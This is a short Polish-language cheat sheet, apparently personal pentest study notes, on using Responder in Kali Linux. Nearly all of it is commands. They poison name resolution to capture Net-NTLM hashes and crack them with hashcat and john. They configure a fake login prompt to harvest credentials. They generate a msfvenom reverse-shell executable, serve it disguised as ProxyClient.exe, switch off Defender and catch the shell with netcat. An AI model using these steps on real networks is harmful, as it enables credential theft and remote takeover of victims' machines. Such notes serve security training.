---
layout:
  title:
    visible: false
  description:
    visible: false
  tableOfContents:
    visible: false
  outline:
    visible: false
  pagination:
    visible: false
---

# Responder Kali

Responder odpowiada na zapytania DNSowe - jak w sieci nie można znaleźć danej strony to Responder będzie się podszywać pod tą szukaną stronę i przechwytywać HASH Net-NTLM

```python
#przechwytywanie hashy Net-NTLM podczas zapytań na różnych protokołach np LLMNR
responder -I eth0 -v

#zapisujemy jeden z hashy do pliku
vim hash

#sprawdzamy jakiego typu (NTLM/MD5 itd) to za hash
hashid hash

#weryfikujemy jaki numer ma NTLM w hashcat
man hashcat

#odszyfrowujemy hasło z tego hasha (w hashcat tryb NTLM czyli -m 5600)
hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt
john --format=ntlmv2 --wordlist=/usr/share/wordlists/rockyou.txt hash
```

**inne**

{% code fullWidth="true" %}
```python
#zmuszenie żeby użytkownik się zalogował na naszej stronie
#edycja pliku konfiguracyjnego
vim /etc/responder/Responder.conf
HTTP Server ON

Always serving EXE OFF
Serving EXE ON
Serving HTML OFF

#wpisujemy w exploratorze w Windowsie jakikolwiek niepoprawny adres http://assaddassxasa

#włączamy Respondera i pojawi się okienko do logowania na stronę
responder -I eth0 -v -b

#przesłanie payloada REVRSE SHELL
#edycja pliku konfiguracyjnego
vim /etc/responder/Responder.conf
HTTP Server ON

Always serving EXE OFF
Serving EXE ON
Serving HTML ON

Custom EXE File to serve
ExeFilename = files/shell.exe

#tworzenie payloada
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.20.10.31 LPORT=8000 -f exe > shell.exe

#przenoszenie stworzonego payloada do katalogu z responderem
mv shell.exe /usr/share/responder/files/shell.exe

#uruchamiamy respondera
responder -I eth0 -v

#wyłączamy Defendera i ściągamy Proxy Client
#wystawiamy listenera na Kalim
nc -nlvp 8000

#klikamy w plik ProxyClient.exe
```
{% endcode %}
